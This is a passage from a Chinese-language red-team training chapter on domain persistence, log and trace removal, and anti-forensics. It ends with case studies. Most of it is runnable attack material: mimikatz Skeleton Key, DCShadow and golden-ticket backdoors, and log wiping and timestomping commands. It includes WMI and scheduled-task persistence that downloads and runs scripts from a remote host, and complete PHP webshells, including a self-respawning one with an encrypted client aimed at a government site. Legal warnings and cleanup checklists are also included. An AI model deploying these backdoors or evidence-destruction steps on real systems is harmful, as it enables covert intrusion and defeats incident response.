# 伪造访问文件服务的白银票据
mimikatz # kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-xxx /target:fileserver.corp.com /service:cifs /rc4:service_hash /ptt
```

### 74.6.3 Skeleton Key（万能钥匙）

**原理**：在域控 LSASS 进程中注入 Skeleton Key，使所有账户都能用 `mimikatz` 这个密码登录。

```powershell
# 在域控上执行（需 Domain Admin）
mimikatz # privilege::debug
mimikatz # misc::skeleton

# 之后任何账户都可用密码 mimikatz 登录域
net use \\DC.corp.com\c$ /user:corp\Administrator mimikatz
```

**特点**：
- 不修改任何账户密码，原密码仍可用
- 重启域控后失效（需重新注入）
- 容易被现代 EDR 检测

### 74.6.4 DSRM 后门

**原理**：DSRM（目录服务恢复模式）是域控的本地管理员账户，其密码与域账户独立。红队可修改 DSRM 密码作为后门。

```powershell
# 1. 修改 DSRM 密码（在域控上执行）
ntdsutil
# set dsrm password
# reset password on server null
# 输入新密码: P@ssw0rd123
# q
# q

# 2. 修改注册表，允许 DSRM 网络登录
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f

# 3. 使用 DSRM 账户登录
# 用户名: Administrator  密码: P@ssw0rd123
# 可通过 PTH 横向到域控
```

### 74.6.5 DCShadow

**原理**：DCShadow 是 DCsync 的"反向操作"——将攻击者机器伪装成域控，向真实域控推送恶意数据（如修改对象的 ACL、添加后门账户）。

**前提**：需 Domain Admin 或具备"复制目录更改"权限的账户。

```powershell
# 使用 Mimikatz 执行 DCShadow
# 1. 注册恶意 DC（必须使用 SYSTEM 权限）
mimikatz # !+
mimikatz # !processtoken  # 获取 SYSTEM token

# 2. 修改域对象（如给某账户添加 DCSync 权限）
mimikatz # lsadump::dcshadow /object:CN=hacker,CN=Users,DC=corp,DC=com /attribute:primaryGroupID /value:512

# 3. 推送修改
mimikatz # lsadump::dcshadow /push

# 4. 清理
mimikatz # !-
```

**特点**：
- 直接修改域数据库，不留常规审计痕迹
- 推送期间注册的"伪 DC"可在事件日志中发现
- 极其隐蔽，难以被检测

### 74.6.6 AdminSDHolder 后门

**原理**：`AdminSDHolder` 是一个特殊容器，其 ACL 每隔 60 分钟会"复制"到所有受保护组（Domain Admins、Enterprise Admins 等）的成员上。攻击者给 AdminSDHolder 添加一个 ACE，则该权限会自动传播到所有域管理员。

```powershell
# 给 AdminSDHolder 添加 hacker 的完全控制权限
Add-ObjectACL -TargetADSpn "CN=AdminSDHolder,CN=System,DC=corp,DC=com" `
    -PrincipalSamAccountName "hacker" -Rights All

# 60 分钟后，hacker 将拥有所有受保护组的完全控制权限
```

### 74.6.7 SID History 后门

**原理**：SID History 用于跨域迁移时保留原 SID。攻击者可将 Domain Admins 的 SID 注入到普通用户的 SID History 中。

```powershell
# 使用 Mimikatz 注入 SID History（需 DCShadow 配合）
mimikatz # lsadump::dcshadow /object:CN=hacker,CN=Users,DC=corp,DC=com /attribute:sIDHistory /value:S-1-5-21-xxx-512
mimikatz # lsadump::dcshadow /push
```

### 74.6.8 委派后门

配置资源约束委派（RBCD），使后门账户可模拟任意用户访问特定服务：

```powershell
# 1. 创建机器账户作为后门
New-MachineAccount -MachineAccount "evil$" -Password $(ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force)

# 2. 配置目标服务允许 evil$ 委派
Set-ADComputer target -PrincipalsAllowedToDelegateToAccount "evil$"

# 3. 使用 evil$ 申请任意用户的票据访问 target
```

---

## 74.7 痕迹清理（日志清理/文件清理/操作痕迹）

### 74.7.1 痕迹清理的目标与原则

痕迹清理不是简单地"删日志"，而是**系统性地消除攻击活动留下的所有可追溯证据**。

#### 红队痕迹清理的目标

1. **规避检测**：让蓝队无法发现攻击活动
2. **延长潜伏期**：减少被溯源的可能性
3. **合规要求**：红队评估结束后恢复系统原状

#### 痕迹分类

| 类别 | 内容 | 清理难度 |
|------|------|---------|
| 日志痕迹 | 安全日志、系统日志、应用日志 | 中 |
| 文件痕迹 | 工具、payload、临时文件 | 中 |
| 注册表痕迹 | 维持点、配置修改 | 低 |
| 网络痕迹 | 连接记录、流量特征 | 高 |
| 操作痕迹 | 命令历史、预读取、最近文档 | 低 |
| 取证痕迹 | USN 日志、$MFT、事件日志文件本身 | 高 |

#### 红队清理原则

> ⚠️ **重要原则**：
> 1. **定向清理，而非全删**：删除特定事件而非清空日志，全删会触发告警
> 2. **时间对齐**：恢复文件时间戳，避免时间异常
> 3. **不留新痕迹**：清理工具本身也要清理
> 4. **闭环可逆**：操作前记录原状态，便于恢复

### 74.7.2 操作痕迹清理

#### 命令历史清理

```bash
# Linux Bash 历史
history -c              # 清空当前会话历史
echo > ~/.bash_history  # 清空历史文件
unset HISTFILE          # 禁用历史记录
export HISTSIZE=0       # 历史记录条数为 0

# 不留痕迹地执行命令（前导空格，不记录历史）
 sensitive_command    # 前导空格 + HISTCONTROL=ignorespace

# 永久禁用历史（红队慎用，会留痕迹）
ln -sf /dev/null ~/.bash_history
```

```powershell
# Windows PowerShell 历史
Remove-Item (Get-PSReadlineOption).HistorySavePath
# 禁用历史保存
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

#### 预读取文件清理

Windows 预读取（Prefetch）记录程序执行历史：

```cmd
:: 删除特定程序的预读取记录
del /f /q C:\Windows\Prefetch\mytool*.pf
```

#### 最近文档清理

```powershell
# 清空最近文档
clear-recyclebin -Force
Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\*" -ErrorAction SilentlyContinue
```

---

## 74.8 日志清理技术（Windows/Linux/Web）

> 💡 **大白话说痕迹清理——为什么要"擦脚印"？**
>
> 你在雪地里走了很长一段路，身后留下了一串清晰的脚印。蓝队就是顺着这些脚印找到你的。
>
> 痕迹清理的本质就是：**把你走过的路，恢复得像没人走过一样。**
>
> 但这里有一个大坑：**完全清空日志 = 告诉管理员"有人来过"**。
> 就像一个办公室，平时桌面都有灰尘，某天桌面一尘不染——这反而引起了保安的警觉。
>
> 所以痕迹清理的最高境界不是"全部擦掉"，而是：
> - **定向删除**：只删你自己的操作记录
> - **伪造日志**：把攻击行为伪装成正常操作
> - **利用审计盲区**：用系统自带功能做操作（比如 `net use` 不会被记入 PowerShell 日志）
>
> 记住三原则：
> 1. **能不删就不删**——优先用"不产生日志"的方式操作
> 2. **能定向就不全删**——删一条日志比删全部更隐蔽
> 3. **能伪造就不删除**——把"可疑操作"改成"正常操作"
>
> 这就像 CIA 特工不是销毁监控录像（太明显），而是替换监控录像中自己的画面。

### 74.8.1 Windows 日志清理

#### Windows 日志体系

| 日志 | 内容 | 位置 |
|------|------|------|
| System | 系统事件、服务、驱动 | `%SystemRoot%\System32\winevt\logs\System.evtx` |
| Security | 登录、权限、审计 | `%SystemRoot%\System32\winevt\logs\Security.evtx` |
| Application | 应用程序事件 | `%SystemRoot%\System32\winevt\logs\Application.evtx` |
| PowerShell | PowerShell 脚本块日志 | `%SystemRoot%\System32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx` |
| Sysmon | Sysmon 监控日志 | `%SystemRoot%\System32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx` |

#### 定向清理（推荐）

定向删除特定事件，而非清空全部，是更隐蔽的手法：

```powershell
# 删除 Security 日志中 EventID=4624（登录成功）的事件
# 使用 PowerShell 操作
$events = Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4624)]]"
$events | ForEach-Object { 
    # 定向删除（实际操作需停止日志服务后修改 evtx 文件）
}

# 停止日志服务后清理（粗暴方式）
net stop eventlog
# 删除日志文件
del C:\Windows\System32\winevt\logs\Security.evtx
net start eventlog
```

#### 经典清理命令

```cmd
:: 清空所有日志（粗暴，会触发告警）
wevtutil el | Foreach-Object {wevtutil cl "$_"}

:: 清空指定日志
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Windows PowerShell"

:: PowerShell 方式
Get-EventLog -LogName Security | Clear-EventLog
```

#### Phantom DLL 绕过

通过让 `wlms.exe`（Windows 许可管理服务）不加载，使日志服务假死，期间的事件不被记录：

```powershell
# 备份并替换 wlms 相关 DLL（高级技巧）
# 适用于特定 Windows 版本
```

#### 关闭审计策略

```cmd
:: 关闭所有审计
auditpol /set /category:* /success:disable /failure:disable

:: 查看当前审计策略
auditpol /get /category:*
```

### 74.8.2 Linux 日志清理

#### Linux 日志位置

| 日志 | 内容 |
|------|------|
| `/var/log/messages` | 系统消息 |
| `/var/log/secure` 或 `auth.log` | 认证、授权 |
| `/var/log/wtmp` | 登录记录（二进制） |
| `/var/log/btmp` | 登录失败记录（二进制） |
| `/var/log/lastlog` | 最后登录记录 |
| `/var/log/audit/audit.log` | auditd 审计日志 |
| `~/.bash_history` | 命令历史 |
| `/var/log/cron` | 计划任务日志 |

#### 定向清理（sed）

```bash
# 删除包含特定 IP 的日志行
sed -i '/10.0.0.100/d' /var/log/auth.log
sed -i '/10.0.0.100/d' /var/log/secure
sed -i '/10.0.0.100/d' /var/log/messages

# 删除特定时间段日志
sed -i '/Jul  1 10:00:00/,/Jul  1 12:00:00/d' /var/log/messages
```

#### 二进制日志清理

`wtmp`、`btmp`、`lastlog` 是二进制文件，需使用专用工具：

```bash
# 使用 utmpdump 查看
utmpdump /var/log/wtmp

# 使用 logtamper 清理
python3 logtamper.py -m 2 -u root -i 10.0.0.100 -f /var/log/wtmp

# 清空 lastlog
> /var/log/lastlog
```

#### 清理登录痕迹

```bash
# 清理当前用户的登录痕迹
echo > /var/log/wtmp
echo > /var/log/btmp
echo > /var/log/lastlog
echo > ~/.bash_history
history -c

# 清理 utmp（当前登录用户）
# /var/run/utmp 记录当前在线用户
```

#### 关闭 auditd

```bash
# 临时停止
service auditd stop
# 永久禁用
systemctl disable auditd
```

### 74.8.3 Web 日志清理

#### Apache/Nginx 日志

```bash
# 删除特定 IP 的访问记录
sed -i '/10.0.0.100/d' /var/log/apache2/access.log
sed -i '/10.0.0.100/d' /var/log/nginx/access.log

# 删除特定 URL（如 WebShell 路径）
sed -i '/shell.php/d' /var/log/apache2/access.log

# 替换攻击者 IP 为合法 IP
sed -i 's/10.0.0.100/192.168.1.100/g' /var/log/apache2/access.log
```

#### IIS 日志

```powershell
# IIS 日志位置
# C:\inetpub\logs\LogFiles\

# 删除特定 IP 记录
$logFile = "C:\inetpub\logs\LogFiles\W3SVC1\u_ex250701.log"
$content = Get-Content $logFile
$content | Where-Object { $_ -notmatch "10.0.0.100" } | Set-Content $logFile
```

#### 数据库痕迹清理

```sql
-- MySQL 清理执行历史
TRUNCATE TABLE mysql.general_log;

-- SQL Server 清理
DBCC SHRINKFILE (GeneralLog, 1);

-- PostgreSQL 清理
DELETE FROM pg_stat_activity WHERE query LIKE '%malicious%';
```

---

## 74.9 反取证技术

### 74.9.1 反取证概述

反取证（Anti-Forensics）旨在阻碍、延迟或误导数字取证分析。与痕迹清理不同，反取证更强调**让取证者得出错误结论**，而非单纯删除。

> 💡 **大白话说反取证——不是"擦掉"，而是"改写"**
>
> 回忆一下谍战片里的经典场景：
> - 特工闯入档案室，把监控录像中自己的画面**替换成清洁工** → 这就是反取证
> - 如果特工直接把监控录像**全部删掉** → 这就是痕迹清理（会被保安立刻发现）
>
> 反取证的高级之处在于：**不让你发现"有人来过"，而是让你觉得"没来什么人"或者"来了个普通人"。**
>
> 举个例子来理解反取证的四种手法：
> 1. **Timestomp（时间戳篡改）**：你的后门文件是今天创建的，你把它改成三年前。取证人员一看："三年前的旧文件，应该不是攻击者放的。"
> 2. **$MFT/USN日志操纵**：Windows文件系统的"日记本"记录了每个文件的改动历史。你清空这个日记本，让别人查不到"什么时候谁动了什么文件"。
> 3. **日志伪造**：你在系统日志里塞了1000条假登录失败记录，来掩盖你真正成功的那一次登录。
> 4. **数据销毁**：不是你"删掉"文件（这样还能恢复），而是用随机数据反复覆盖那片磁盘区域——就像把字条烧成灰，再和别的灰混在一起。

### 74.9.1 反取证概述

反取证（Anti-Forensics）旨在阻碍、延迟或误导数字取证分析。与痕迹清理不同，反取证更强调**让取证者得出错误结论**，而非单纯删除。

#### 反取证四大目标

1. **Avoidance（规避）**：不留痕迹
2. **Obfuscation（混淆）**：让痕迹无法解读
3. **Corruption（破坏）**：破坏取证数据完整性
4. **Deception（欺骗）**：植入虚假痕迹误导分析

### 74.9.2 时间戳篡改（Timestomp）

修改文件的创建、修改、访问时间，伪造文件"古老"的假象：

```bash
# Linux touch 修改时间
touch -t 202001010000.00 /tmp/backdoor.sh    # 修改为 2020-01-01
touch -r /etc/passwd /tmp/backdoor.sh          # 复制 /etc/passwd 的时间戳

# 保留原时间戳，便于事后恢复
stat /tmp/backdoor.sh > /tmp/original_ts.txt
```

```powershell
# PowerShell 修改文件时间
$file = "C:\Windows\Temp\payload.exe"
$(Get-Item $file).CreationTime = "01/01/2020 00:00:00"
$(Get-Item $file).LastWriteTime = "01/01/2020 00:00:00"
$(Get-Item $file).LastAccessTime = "01/01/2020 00:00:00"
```

### 74.9.3 $MFT 与 USN 日志

$MFT（主文件表）记录所有文件的元数据，USN 日志记录文件系统变更。两者是数字取证的关键证据。

```cmd
:: 清除 USN 日志
fsutil usn deletejournal /d /n C:

:: 查看 USN 日志
fsutil usn readjournal C:
```

### 74.9.4 内存痕迹清理

内存中的痕迹（进程、网络连接、注入代码）是取证重要来源：

```powershell
# 清理 PowerShell 命令历史内存
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()

# 结束可疑进程，清理内存痕迹
Stop-Process -Name "suspicious" -Force
```

### 74.9.5 日志伪造

注入虚假日志，误导取证分析方向：

```bash
# 伪造大量虚假登录记录，掩盖真实攻击
for i in $(seq 1 1000); do
    logger -p auth.info "Failed password for invalid user admin from 192.168.1.$((RANDOM % 254 + 1)) port $((RANDOM % 65535)) ssh2"
done
```

### 74.9.6 数据销毁

确保删除的数据无法恢复：

```bash
# 安全擦除（多次覆写）
shred -vfz -n 5 /tmp/sensitive_file

# 擦除磁盘空闲空间
dd if=/dev/urandom of=/tmp/bigfile bs=1M; rm /tmp/bigfile

# srm（安全 rm）
srm -v /tmp/evidence/
```

### 74.9.7 反取证工具

| 工具 | 功能 | 平台 |
|------|------|------|
| Metasploit `timestomp` | 篡改 MFT 时间戳 | Windows |
| `Set-MacAttribute` | 修改 MAC 时间 | Windows |
| `fsutil` | 清理 USN 日志 | Windows |
| `shred` | 安全删除文件 | Linux |
| `logtamper` | 清理 wtmp/btmp | Linux |
| `Clear-EVENTLOG` | 清理事件日志 | Windows |
| `Chamomile` | 修改 evtx 日志 | Windows |

---

## 74.10 红队操作规范与安全意识

### 74.10.1 红队操作的"三条红线"

红队评估必须在严格的法律与道德框架内进行，以下三条红线**不可逾越**：

1. **授权红线**：未经书面授权的任何攻击行为均属违法
2. **破坏红线**：不得对业务系统造成不可恢复的破坏
3. **数据红线**：不得窃取、泄露、贩卖目标数据

### 74.10.2 操作留痕与可回溯

红队评估与真实攻击的最大区别在于**全程可回溯**：

#### 操作记录规范

```powershell
# 红队操作记录模板
$operationLog = @"
=== 红队操作记录 ===
时间: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
操作员: RedTeam-Alice
目标: 192.168.1.10 (DC01.corp.com)
操作: 创建计划任务维持
命令: schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\update.exe" /sc onlogon
影响: 在 DC01 上创建持久化后门
清理方式: schtasks /delete /tn "WindowsUpdate" /f
"@
$operationLog | Out-File -Append "C:\RedTeam\operations.log"
```

#### 关键信息留存

红队评估中必须记录以下信息，便于事后清理与报告：

| 类别 | 内容 |
|------|------|
| 植入的后门 | 类型、位置、触发条件、清理方式 |
| 修改的配置 | 原值、新值、修改时间 |
| 创建的账户 | 用户名、权限、清理方式 |
| 上传的工具 | 文件路径、文件哈希 |
| 横向移动路径 | 源、目标、使用凭据 |

### 74.10.3 行动结束的清理清单

红队评估结束后，必须按清单逐项清理：

#### Windows 清理清单

```powershell
# 1. 删除所有维持点
schtasks /delete /tn "WindowsUpdate" /f
sc delete "WindowsDefenderUpdate"
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f

# 2. 删除后门账户
net user hacker$ /delete

# 3. 删除上传的工具
Remove-Item C:\Windows\Temp\payload.exe -Force
Remove-Item C:\Users\Public\update.exe -Force

# 4. 恢复审计策略
auditpol /set /category:* /success:enable /failure:enable

# 5. 删除 WMI 事件订阅
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -like "Windows*"} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -like "Windows*"} | Remove-WmiObject
```

#### 域环境清理清单

```powershell
# 1. 删除域后门账户
Remove-ADUser -Identity "hacker"

# 2. 重置 krbtgt 密码（两次，相隔 12 小时以上）
Set-ADAccountPassword -Identity krbtgt -Reset

# 3. 清理 AdminSDHolder ACL
Remove-ObjectACL -TargetADSpn "CN=AdminSDHolder,CN=System,DC=corp,DC=com" -PrincipalSamAccountName "hacker"

# 4. 重置被修改的 DSRM 密码
ntdsutil
# set dsrm password
# reset password on server null
```

### 74.10.4 被发现后的应急处理

红队评估中可能被蓝队发现，此时应：

1. **保持冷静**：不要慌乱删除，可能留下更多痕迹
2. **评估影响**：判断被发现的是哪个维持点、是否牵连其他资产
3. **主动沟通**：根据规则与客户/裁判沟通
4. **有序撤退**：按计划清理相关痕迹，保留未暴露的维持点
5. **复盘总结**：分析被发现的原因，改进技术

### 74.10.5 法律与合规要求

> ⚠️ **重要法律提示**：
>
> 根据《中华人民共和国网络安全法》《中华人民共和国刑法》第 285、286 条：
> - 未经授权侵入计算机信息系统，处三年以下有期徒刑
> - 非法获取数据、控制系统，处三年以下有期徒刑，情节严重处七年以下
> - 提供入侵工具，处三年以下有期徒刑
>
> 红队评估必须满足：
> 1. **书面授权**：与客户签订正式的渗透测试授权书
> 2. **范围明确**：明确授权的 IP 范围、系统、时间窗口
> 3. **数据保密**：评估中获取的数据严格保密，评估后销毁
> 4. **不留后门**：评估结束后彻底清理所有维持点
> 5. **报告交付**：提交详细的评估报告与整改建议

---

## 案例分析

### 案例 1：Windows 系统权限维持实战

**背景**：某能源企业红队评估，已通过钓鱼获取一台员工终端的初始 shell（域成员机器，普通用户权限），需建立多层维持，确保权限不丢失。

**目标**：在不被 EDR 检测的前提下，建立至少 3 层权限维持。

**实施步骤**：

1. **提权至 SYSTEM**

```powershell
# 利用未打补丁的 CVE-2021-1675（PrintNightmare）提权
python3 CVE-2021-1675.py corp.com/user:Pass@192.168.1.50 '\\10.0.0.100\share\evil.dll'
# 获取 SYSTEM 权限
whoami
# 输出: nt authority\system
```

2. **第一层维持：COM 劫持（用户级，隐蔽性高）**

```powershell
# 劫持 TaskScheduler COM 组件
$clsid = "{0E2910F1-C5B6-4B8B-A5C5-3E8E1D3E8E8E}"
$path = "HKCU:\Software\Classes\CLSID\$clsid\InProcServer32"
New-Item -Path $path -Force | Out-Null
Set-ItemProperty -Path $path -Name "(Default)" -Value "C:\Users\Public\payload.dll"
Set-ItemProperty -Path $path -Name "ThreadingModel" -Value "Apartment"
# 用户登录后 Explorer 自动调用，加载 payload.dll
```

3. **第二层维持：WMI 事件订阅（系统级，无文件）**

```powershell
# WMI 事件过滤器：系统启动后 5 分钟触发
$filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
    Name = "SystemHealthCheck"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 360"
}

$consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{
    Name = "SystemHealthConsumer"
    CommandLineTemplate = "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.100/stage.ps1')"
}

Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

4. **第三层维持：隐藏计划任务（系统级，冗余）**

```powershell
# 创建隐藏计划任务
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.100/stage.ps1')"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "MicrosoftCompatibilityAppraiser" -Action $action -Trigger $trigger -Principal $principal -Settings $settings

# 隐藏任务（删除 SD）
$taskFile = "C:\Windows\System32\Tasks\MicrosoftCompatibilityAppraiser"
$xml = Get-Content $taskFile -Raw
$xml = $xml -replace '<SecurityDescriptor>.*?</SecurityDescriptor>', ''
$xml | Out-File $taskFile -Encoding Unicode
```

5. **验证维持**

```powershell
# 重启后验证
shutdown /r /t 0
# 重启后 5 分钟，WMI 触发，获取回连
# 用户登录后，COM 劫持触发，再次获取回连
```

**结果**：成功建立三层冗余维持，即使单点被发现删除，仍有其他维持点可用。

**关键收获**：
- 多层冗余是权限维持的核心原则
- COM 劫持隐蔽性最高，应作为首层
- WMI 事件订阅不落地文件，规避文件扫描
- 隐藏计划任务提供系统级冗余

---

### 案例 2：WebShell 隐藏与不死马

**背景**：某政府网站红队评估，通过 SQL 注入获取 WebShell，但网站定期扫描 Web 目录，需建立持久且隐蔽的 Web 后门。

**目标**：建立不会被常规扫描发现的不死 WebShell。

**实施步骤**：

1. **基础 WebShell 植入**

```php
<?php
// 伪装成配置文件 config.php
$auth = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"; // sha256("redteam")
if (hash('sha256', $_POST['token']) === $auth) {
    $cmd = $_POST['cmd'];
    echo shell_exec($cmd);
}
?>
```

2. **不死马（内存马）部署**

```php
<?php
// deploy.php —— 部署一次后删除
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);

$shellPath = '/var/www/html/.cache/sess_'.md5('redteam').'.php';
$shellCode = '<?php
$auth="9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08";
if(hash("sha256",$_POST["token"])===$auth){
    @eval($_POST["cmd"]);
}
?>';

while (true) {
    if (!file_exists($shellPath)) {
        @mkdir(dirname($shellPath), 0777, true);
        @file_put_contents($shellPath, $shellCode);
        @touch($shellPath, time() - 86400 * 30);  // 伪造 30 天前的修改时间
    }
    usleep(500000);  // 每 0.5 秒检查一次
}
?>
```

3. **PHP 内存马（利用 `auto_prepend_file`）**

```ini
; 修改 php.ini 或 .user.ini
auto_prepend_file = "/tmp/.hidden_memshell.php"
```

```php
<?php
// /tmp/.hidden_memshell.php —— 每个 PHP 请求都会加载
if (isset($_SERVER['HTTP_X_CMD'])) {
    $cmd = base64_decode($_SERVER['HTTP_X_CMD']);
    $key = substr(md5($_SERVER['HTTP_X_KEY']), 0, 16);
    $cmd = openssl_decrypt($cmd, 'AES-128-ECB', $key);
    echo shell_exec($cmd);
    exit;
}
?>
```

4. **利用 .htaccess 隐藏**

```apache
# /var/www/html/.htaccess
# 1. 将特定 User-Agent 的请求路由到后门
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} "^Mozilla/5.0$"
RewriteRule ^update/?$ /tmp/.shell.php [L]

# 2. 隐藏后门文件列表
<FilesMatch "^\.">
    Order allow,deny
    Deny from all
</FilesMatch>
```

5. **客户端连接工具**

```python
# redteam_shell.py
import requests
import base64
import hashlib
from Crypto.Cipher import AES

url = "https://target.gov.cn/update"
key = b"redteam2025!@#$%^&"
token = hashlib.sha256(b"redteam").hexdigest()

while True:
    cmd = input("shell> ")
    if cmd == "exit":
        break
    cipher = AES.new(key[:16], AES.MODE_ECB)
    padded = cmd.encode().ljust(16 * ((len(cmd.encode()) + 15) // 16))
    encrypted = cipher.encrypt(padded)
    
    r = requests.post(url, 
        data={"token": token, "cmd": base64.b64encode(encrypted).decode()},
        headers={"User-Agent": "Mozilla/5.0"})
    print(r.text)
```

**结果**：成功部署多层 WebShell：
- 不死马每 0.5 秒重生，删除即恢复
- PHP 内存马无文件落地
- .htaccess 后门通过特征 Header 触发
- 加密通信，规避 WAF

**关键收获**：
- 不死马是 Web 维持的核心技术
- `auto_prepend_file` 实现真正的无文件内存马
- Header 触发比 POST 参数更隐蔽
- 加密通信是规避 WAF 的关键

---

### 案例 3：域环境权限维持技巧

**背景**：在某大型企业红队评估中，已攻陷域控（corp.com），获取 krbtgt Hash 与 Domain Admin 权限。需在域控上建立隐蔽的域级后门，确保长期访问能力。

**目标**：建立至少 4 种域级维持，相互冗余，且难以被蓝队排查。

**实施步骤**：

1. **黄金票据（ krbtgt 后门）**

```powershell
# 导出 krbtgt Hash
mimikatz # lsadump::dcsync /user:corp\krbtgt
# 得到 Hash: a1b2c3d4...

# 生成黄金票据并注入
mimikatz # kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:a1b2c3d4... /id:500 /ptt

# 验证
dir \\DC01.corp.com\c$
```

2. **DSRM 后门**

```powershell
# 修改 DSRM 密码
ntdsutil
# set dsrm password
# reset password on server null
# 新密码: RedTeam!2025
# q
# q

# 允许 DSRM 网络登录
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f

# 后续可通过 PTH 使用 DSRM 账户登录
# 用户名: Administrator  密码: RedTeam!2025
```

3. **AdminSDHolder 后门**

```powershell
# 创建后门账户
New-ADUser -Name "svc_health" -SamAccountName "svc_health" -Path "CN=Users,DC=corp,DC=com" -AccountPassword (ConvertTo-SecureString "RedTeam!2025" -AsPlainText -Force) -Enabled $true

# 给 AdminSDHolder 添加 svc_health 的完全控制权限
Add-ADPermission -Identity "CN=AdminSDHolder,CN=System,DC=corp,DC=com" -User "corp\svc_health" -ExtendedRights All

# 60 分钟后，svc_health 将自动获得所有受保护组（含 Domain Admins）的完全控制权限
```

4. **SID History 后门（DCShadow）**

```powershell
# 使用 DCShadow 给 svc_health 添加 Domain Admins 的 SID History
# 需要 SYSTEM 权限
mimikatz # !+
mimikatz # !processtoken

# 修改 svc_health 的 SID History
mimikatz # lsadump::dcshadow /object:CN=svc_health,CN=Users,DC=corp,DC=com /attribute:sIDHistory /value:S-1-5-21-1234567890-1234567890-1234567890-512

# 推送修改
mimikatz # lsadump::dcshadow /push

# 清理
mimikatz # !-

# 之后 svc_health 即拥有 Domain Admins 权限（通过 SID History）
```

5. **验证域级维持**

```powershell
# 验证黄金票据
klist
# 显示: 客户端: Administrator @ CORP.COM

# 验证 AdminSDHolder 后门
Get-ADUser svc_health -Properties memberOf
# 60 分钟后将显示 Domain Admins 成员

# 验证 SID History
Get-ADUser svc_health -Properties sIDHistory
# 显示: S-1-5-21-1234567890-1234567890-1234567890-512
```

**结果**：成功建立 4 种域级冗余维持：
- 黄金票据（即使重置所有密码仍有效）
- DSRM 后门（独立于域账户的本地管理员）
- AdminSDHolder 后门（自动传播权限）
- SID History 后门（DCShadow 植入，无日志痕迹）

**关键收获**：
- 域级维持的关键是"独立于单一凭据"
- 黄金票据是最后的"保底"维持
- AdminSDHolder 是最隐蔽的权限维持
- DCShadow 植入的 SID History 几乎无法检测
- 评估结束后必须重置 krbtgt（两次）并清理所有后门

---

### 案例 4：痕迹清理实战

**背景**：红队评估接近尾声，需在退出前清理所有操作痕迹，让蓝队无法溯源攻击路径。

**目标**：系统性清理 Windows 与 Linux 系统上的攻击痕迹，同时不触发安全告警。

**实施步骤**：

1. **Windows 痕迹清理**

```powershell
# === 清理日志 ===
# 定向删除安全日志中的攻击相关事件（EventID 4624 登录成功、4688 进程创建）
# 使用 wevtutil 定向清理（保留其他日志，避免触发"日志清空"告警）

# 删除 PowerShell 操作日志
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# 删除特定 EventID 的事件（高级技巧）
$startTime = (Get-Date).AddHours(-24)
$events = Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime=$startTime; Id=4624,4688,4672} -ErrorAction SilentlyContinue
# 逐条删除（实际需停止日志服务后操作 evtx 文件）

# === 清理文件痕迹 ===
# 删除上传的工具
Remove-Item C:\Windows\Temp\payload.exe -Force
Remove-Item C:\Users\Public\update.exe -Force
Remove-Item C:\Windows\Temp\*.log -Force

# 恢复预读取
Remove-Item C:\Windows\Prefetch\payload*.pf -Force

# === 清理注册表痕迹 ===
# 删除维持点
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f

# 清理 PowerShell 历史
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force

# === 恢复审计策略 ===
auditpol /set /category:* /success:enable /failure:enable
```

2. **Linux 痕迹清理**

```bash
# === 清理日志 ===
# 定向删除包含攻击者 IP 的日志
ATTACKER_IP="10.0.0.100"
for log in /var/log/auth.log /var/log/syslog /var/log/messages /var/log/secure /var/log/cron; do
    [ -f "$log" ] && sed -i "/$ATTACKER_IP/d" "$log"
done

# 清理 wtmp、btmp（登录记录）
utmpdump /var/log/wtmp | grep -v "$ATTACKER_IP" | utmpdump -r > /tmp/wtmp.clean
mv /tmp/wtmp.clean /var/log/wtmp

# 清理 bash 历史
history -c
echo > ~/.bash_history
unset HISTFILE
export HISTSIZE=0

# === 清理文件痕迹 ===
# 删除上传的工具
shred -vfz -n 3 /tmp/.update
shred -vfz -n 3 /tmp/.backdoor
rm -f /tmp/.update /tmp/.backdoor

# 清理临时文件
